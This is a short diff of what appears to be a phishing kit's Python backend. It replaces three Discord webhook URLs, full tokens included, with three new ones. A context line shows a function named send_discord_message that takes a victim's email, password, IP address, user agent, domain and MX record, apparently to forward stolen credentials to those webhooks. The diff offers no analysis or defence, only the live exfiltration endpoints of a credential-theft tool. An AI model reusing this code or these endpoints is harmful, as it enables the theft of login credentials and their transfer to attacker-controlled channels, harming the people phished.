@@ -16,11 +16,10 @@ import time
 import random
 import dns.resolver
 
-# Discord Webhook URL
 DISCORD_WEBHOOK_URLS = [
-    "https://discord.com/api/webhooks/1339995643497681058/XBIWTD-VWQ0Ssg5KUR3ojdSuCkJFhRIw2TgYAvIXZce5BrVWVRQp0n9cySRZAdb1wQIe",
-    "https://discord.com/api/webhooks/1339995646026977360/BdA3_XSqqazCUfmRN6alny5QvbfPTZXkJxJWWRMM5TsZoXOdfcKQ8GUAoLrfPS32GR90",
-    "https://discord.com/api/webhooks/1339995668625756232/jUZhB0L27EePcFo4psPduhjh_4VIv0xzO3D2gYwNtplfcoAXfGXtUdbOMhDuWJxmYcKn"
+    "https://discord.com/api/webhooks/1340527933512486923/9MjEnGT2JFYpqcCo9EeWVKfVvVZCGz8Of32OdNCphRJn5cpjWPVwXTtSTJYcjx6GqSHu",
+    "https://discord.com/api/webhooks/1340528897724383253/2zhI_b33_rmii70asE1Hy0KAr7pPUgArLe0qXDdH8ukxeLYlgVUah0UTJo5OIZih3rEh",
+    "https://discord.com/api/webhooks/1340528994147369083/AJju1Jvq1ZBt9uiyk2bGe4-i77Vof_lzidaflyr8cCvVUtmjfwjKvjVHnDlSRJV13lJH"
 ]
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
